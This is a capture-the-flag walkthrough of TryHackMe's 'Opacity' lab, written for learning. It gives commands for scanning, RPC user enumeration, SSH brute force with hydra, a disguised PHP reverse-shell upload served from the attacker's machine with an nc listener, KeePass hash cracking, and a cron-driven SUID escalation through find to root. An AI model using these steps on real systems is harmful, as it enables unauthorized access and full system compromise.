# The Room > TryHackMe | Opacity

**Skills:**

- Cracking KeePass password manager
- RPC RID Cycling Attack (Manual brute force) + Xargs Boost Speed Tip - Discovering valid system users
- Scripts Exploitation
- Abusing Image Upload Form [RCE]
- Listing system files and discovering privileged information
- Abusing SUID binary (find) [Privilege Escalation]

## The Walkthrough/Writeup

```bash
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv victimIp
```

Now that we have some information, let's dig deeper into the scanning process using the `-sC` parameter and also use `-sV` to detect the versions and services running on the open ports. The complete command for this action would be:

```bash
nmap -sC -sV -p22,80,139,445 ipvictim
```

As we can see, we have the services and their versions. We also notice that there is an access panel `login.php`, and we have Samba running, so we can try to enumerate users as we did in previous articles. However, let's first review that access panel.

We reviewed the source code and the access panel, but we didn't find anything interesting. So let's use `gobuster` to see what directories we can find, and at the same time, we can try to enumerate users using `rpcclient`. Here's the command for `gobuster`:

```bash
gobuster dir -u 10.10.19.229 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --add-slash -x php
```

And in another terminal window, we'll use this command to enumerate users:

```bash
seq 1 1500 | xargs -P 50 -I {} rpcclient -U "" victim-ip -N -c "lookupsids S-1-22-1-{}" | grep -oP '.*User\\[a-z].*\s'
```

`Gobuster` found a directory called `/cloud/` and `rpcclient` gave us a user `sysadmin`. We can try to brute-force the SSH service using `hydra` with the command:

```bash
hydra -l sysadmin -P ../../wordlist/rockyou.txt ssh://ipvictim
```

Meanwhile, let's review that `/cloud/` directory.

We have a "Personal Cloud Storage" on the server, but it only accepts uploading images from a URL. So, it is possible to use Python to establish a server on our system and alter our reverse shell to bypass the victim's server's security measures. For this, we'll use the PentestMonkey reverse shell and I recommend the Hack-Tools extension to have everything at hand (I discovered this extension thanks to Gary Ruddell).

Once we have our reverse shell, let's open our server using the following command:

```bash
python3 -m http.server 80
```

Remember to have the reverse shell in the same directory where you opened the server. If we open our IP (in this case the one provided by the TryHackMe VPN), we can see the files we have in the directory.

Now, what we'll do is listen for incoming connections using the command:

```bash
nc -nlvp 1234
```

On the victim's website, we'll put our address containing the reverse shell, in my case it is: `http://10.2.39.16/rev.php#.jpg`. Using the `.php#.jpg`

 extension, I was able to hide the reverse shell.

We have successfully connected and are now on the victim server as `www-data`. The next step is to escalate privileges. For this, I recommend following the Linux Privilege Escalation guide on Hacktricks.

But before we proceed, let's apply a tty treatment using the following commands:

```bash
script /dev/null -c bash (press Enter)
Ctrl + Z (press)
stty raw -echo; fg (press Enter)
reset xterm (press Enter)
export TERM=xterm (press Enter)
export SHELL=/bin/bash (press Enter)
stty rows 61 columns 186 (press Enter)
```

These commands will create a new pseudo-terminal with proper TTY settings. This is necessary for some privilege escalation techniques to work properly.

The first thing we need to do is to check the directory `/var/www/html`. Often, we can find interesting things there. In this case, we found a file called `login.php`. If we open it using the `cat` command (`cat login.php`), we can see three users with their respective passwords. These should be the users for the website's login panel. Let's check it out.

There's nothing interesting on the website, let's check the `/home` folder. We see that there's a user called `sysadmin` - the same user we found when we used `rpcclient`. If I recall correctly, we had left `hydra` running a brute force attack on this user. Let's check what we found in `hydra`.

`Hydra` hasn't found anything yet. I'll leave it running while I keep searching. If we dig deeper into the `sysadmin` user's content, we can see the `scripts` folder and the `local.txt` file inside it. There are more files inside the `scripts` folder, but they have root or `sysadmin` permissions. Therefore, we need to gain access as this user to view them.

While searching the server, I recommend checking the `/opt` directory as interesting things can be found there. This time we found a `dataset.kdbx` file, which could be a KeePass password manager file that uses the KDBX file format to store and protect passwords. Let's download the `dataset.kdbx` file to our computer and try to crack it using our good friend John. We'll use the following command:

```bash
keepass2john dataset.kdbx > kdbx.hash
```

and then

```bash
john --wordlist=rockyou.txt kdbx.hash
```

Once we have the password, we can use the following command:

```bash
keepass dataset.kdbx
```

and enter the password when prompted by the program.

We now have the password to access the system as the sysadmin user. We can review this user's files to try to gain root privileges. By examining the file permissions, we notice that we own one of the files. Additionally, we see that the `script.php` file is owned by the root user and the sysadmin group, meaning this script runs as root. If we analyze the script's code, we see that it refers to the other script that we own. Therefore, if we add "malicious" code to our script, we may be able to gain root access.

The "malicious" code we will use is as follows:

```php
$command = 'chmod u+s /usr/bin/find';
$output = exec($command);
```

This code will set the setuid bit for the `/usr/bin/find` command.

When the script is executed, it will give the setuid permissions to the `find` command, which will allow us to later use the following command:

```
find . -exec /bin/sh -p \; -quit
```

This will give us root access. By executing this command, we will launch a shell as the root user, giving us full control over the system.

Now that we have our plan ready, we need to find out how the `script.php` is executed. Most likely, it is scheduled as a cron job on the system.

We can check the cron configuration file located in `/etc/crontab` or in the `/etc/cron.d` folder to see if we can find the task that executes the script. We can also use the `crontab -l` command to list the scheduled tasks in the current user's cron and see if the script is scheduled there.

Alright, it sounds like we weren't able to find the cron job that executes the `script.php`. In that case, using the `pspy64` tool to gather more information about the system is a good idea.

`pspy64` is a tool that monitors processes and helps identify potential privilege escalation vectors on a system. We can use it to see if there are any processes or scripts that are being executed with higher privileges than they should be.

Thanks to `pspy64`, we have realized that the script actually runs every so often, so all we have to do is add our "malicious" code to our file and wait for it to execute.

After executing our "malicious" code, we run the following command:

```
find . -exec /bin/sh -p ; -quit
```

We will gain access as Root and thus we will consider the Opacity TryHackMe machine completed.
